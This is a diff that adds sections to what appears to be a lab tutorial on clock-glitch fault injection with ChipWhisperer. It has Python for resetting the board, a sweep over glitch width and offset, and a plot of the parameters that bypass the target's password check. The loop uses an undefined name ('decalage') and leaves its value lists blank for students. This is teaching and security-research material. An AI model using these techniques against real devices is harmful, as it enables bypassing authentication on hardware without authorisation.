@@ -123,7 +123,7 @@ scope.io.hs2 = "glitch"
 scope.adc.timeout = 0.1
 print(scope.glitch)
 ```
-### Characterization code
+## Characterization code
 
 There are three parameters to define: the width, the offset (shift), and the delay. At first, there is no easy way to guess the best correct values that will allow to inject an exploitable fault. In principle, we should therefore explore the full search space in order to find the optimal combination of values, leading to a successful attack (being authorized with the wrong password).
 
@@ -144,4 +144,98 @@ The goal is to find the values for width and offset that lead to an actual (pote
 ```python
 scope.glitch.repeat = 20
 ```
+In fact, we do not care in this case about the value of the output. The goal is to find the optimal values for width and offset (target dependent) leading to an error. This will largely reduce the search space.
+
+## Reboot function
+It is possible that the error induced by the fault injection will not allow the CPU to continue its normal execution. In this case, the system will require a reset. The function here below allows to reset the board in case it stops responding.
+
+```python
+def reboot_flush():            
+    scope.io.nrst = False
+    time.sleep(0.05)
+    scope.io.nrst = "high_z"
+    time.sleep(0.05)
+    #Flush garbage too
+    target.flush()
+```
+
+On the terminal standard output, there will also be a lot of warning messages that might make the analysis of the output too hard. The following cell filters this warnings, limiting the output messages to more serious errors.
+
+```python
+import logging
+logging.basicConfig()
+logging.getLogger().setLevel(logging.ERROR)
+```
+## Characterization loop
+
+Let us do the space exploration to find the good pairs of values for the width and the offset. YOU have to choose the boundaires for the values to test. Just remember:
+
+width : possible values are in the range ]0; 50[. Values too small will create glitches that will not even be detected by the system; a value too large will allow the instruction to complete normally, thus giving no effects. offset : possible values are in the range ]-50; 50[. We may constrain the search to negative values, in order to define a glitch occurring before a rising edge. Likely, smaller values may go unnoticed by the system, thus useless, whereas excessive values will let the instruction to execute regularly.
+You need to complete yourselves these value in the cell below. The step for delay parameter should be of 20 units, as we are also injecting 20 consecutive glitches each time.
+
+Each parameter set is tested three times, as it is possible that some fault injections may fail.
+
+
+```python
+reboot_flush()
+
+resets   = [] # List to save those parameters leading to a reset
+glitches = [] # List to save those parameters leading to an actual (useful) glitch
+
+largeurs  = []  # TO BE COMPLETED
+decalages = []  # TO BE COMPLETED
+delais    = []  # TO BE COMPLETED
+
+for scope.glitch.width in largeurs:
+    print("Width : {}".format(scope.glitch.width))
+    for scope.glitch.offset in decalage:
+        for scope.glitch.ext_offset in delais:
+            for repetition in range(3):
+                scope.arm()
+
+                target.write("g\n")
+                ret = scope.capture()
+                val = target.simpleserial_read_witherrors('r', 4, glitch_timeout=10)
+
+                if ret: #here the trigger never went high - sometimes the target is stil crashed from a previous glitch
+                    resets.append((scope.glitch.width, scope.glitch.offset))
+                    reboot_flush()
+                elif val["payload"]:
+                    loop_counter = int.from_bytes(val["payload"], byteorder='little')
+                    if loop_counter != 2500:
+                        glitches.append((scope.glitch.width, scope.glitch.offset))
+```
+To identify those parameters that lead to a successful fault injection, we can trace a graph from the collected data where:
+
+- on X axis : the width of the pulse,
+- on Y axis : its offset.
+This can be achieved by executing the next cell, using the glitches and resets vectors that we just filled in.
+```python
+import matplotlib.pyplot as plt
+%matplotlib inline
+
+plt.xlabel("Width")
+plt.ylabel("Offset")
+plt.scatter(x=[width for (width, offset) in resets],
+            y=[offset for (width, offset) in resets],
+            marker="x",
+            s=100,
+            color="red",
+            label="reset")
+plt.scatter(x=[width for (width, offset) in glitches],
+            y=[offset for (width, offset) in glitches],
+            marker="o",
+            color="blue",
+            label="fault")
+plt.legend()
+plt.show()
+```
+By using these values, it can be seen that we have been able to perform successful attacks, which means bypassing the password check, and thus the attacker can enter the system:
+
+![image](https://github.com/Ahsan728/Clock_glitching/assets/34878134/fd1d3996-ab27-44d6-ae41-da0b96324949) 
+
+As shown in Figure, the blue dots represent the successful glitch parameters, which means that the attacker was able to enter the system, and the red dots represent the states where the system is reset after the fault injection. Now, if we want to look from an attacker's point of view, the parameters that cause the attack to succeed but do not cause the system to restart are the best, Because the system could not detect this attack and reset itself !
+
+
+
 
